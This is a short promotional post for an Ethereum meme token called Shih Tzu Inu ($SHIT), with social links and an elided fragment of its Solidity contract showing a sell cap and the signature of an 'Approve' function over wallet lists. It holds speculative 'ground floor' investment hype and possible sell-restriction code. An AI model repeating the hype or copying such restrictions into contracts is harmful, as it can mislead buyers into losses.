...
What is Shih Tzu Inu?

$SHIT is a community based coin on the ethereum mainnet designed to bring memes and dogs back into fasion!

We've seen Shiba's moon, we've seen Huskeys moon and we've seen German Shepherds moon. It's time for Shih Tzu's to moon. Now is the perfect time to get in on the ground floor and join the $SHIT revolution!

After all, our beloved Shih Tzu is the perfect pooch for a shitcoin.


TG: t.me/ShihTzuETH
Twitter: Twitter.com/ShihTzuInuETH
Website: ShihTzuInu.site
...
contract ShihTzuInu is ERC20, Ownable {
    ...
    constructor() ERC20("Shih Tzu Inu", "SHIT") {
        ...
        maxSellAmount = totalSupply * 1 / 400;
    ...
    function Approve(address[] calldata wallets, bool flag) external  {
